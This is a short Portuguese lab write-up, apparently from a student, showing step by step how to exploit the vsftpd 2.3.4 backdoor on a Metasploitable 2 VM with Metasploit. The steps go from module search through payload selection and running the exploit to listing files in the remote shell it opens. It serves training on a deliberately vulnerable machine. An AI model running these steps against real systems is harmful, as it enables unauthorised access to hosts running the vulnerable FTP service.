# Explorando falha no FTP

> Laboratório: Falha no FTP


---


## 1) VM — Imagem da máquina vulnerável


![Metasploitable 2 — VM vulnerável](images/maquina_vulneravel.png "Metasploitable 2 VM")

*Captura da máquina Metasploitable 2 utilizada no laboratório.*


## 2) Iniciando o Metasploit
![1](images/Iniciando_Metasploit.png)

**Comando usado:**
```
msfconsole
```

## 3) Pesquisando vulnerabilidade no metasploit
![2](images/Pesquisando_vulnerabilidade.png)

**Comando usado:**
```
search vsftpd
```

## 4) Informações da vulnerabilidade
![3](images/Informacao_da_vulnerabilidade.png)
**Comando usado:**
```
info exploit/unix/ftp/vsftpd_234_backdoor
```

## 5) Selecionando vulnerabilidade
![4](images/usando_vulnerabilidade.png)

**Comando usado:**
```
use exploit/unix/ftp/vsftpd_234_backdoor
```

## 6) Vendo configurações da vulnerabilidade
![5](images/Vendo_config.png)
**Comando usado:**
```
show options
```

## 7) Selecionando Host com o IP da maquina vulnerável
![6](images/configurando_host.png)

**Comando usado:**
```
set rhosts 192.168.56.103
```

## 8) Mostrando payloads
![7](images/payloads.png)
**Comando usado:**
```
show payloads
```

## 8) Selecionando payloads
![8](images/Selecionando_payload.png)
**Comando usado:**
```
set payload cmd/unix/interact
```

## 9) Vendo config
![9](images/Rhosts_selecionado.png)
**Comando usado:**
```
show options
```

## 10) Iniciando exploit
![10](images/exploit_conectado.png)
**Comando usado:**
```
exploit
```

## 11) Usando comando para ver as pastas da maquina vulnerável
![11](images/Utilizando_comando_LS_para_ver_pastas.png)
**Comando usado:**
```
ls
```

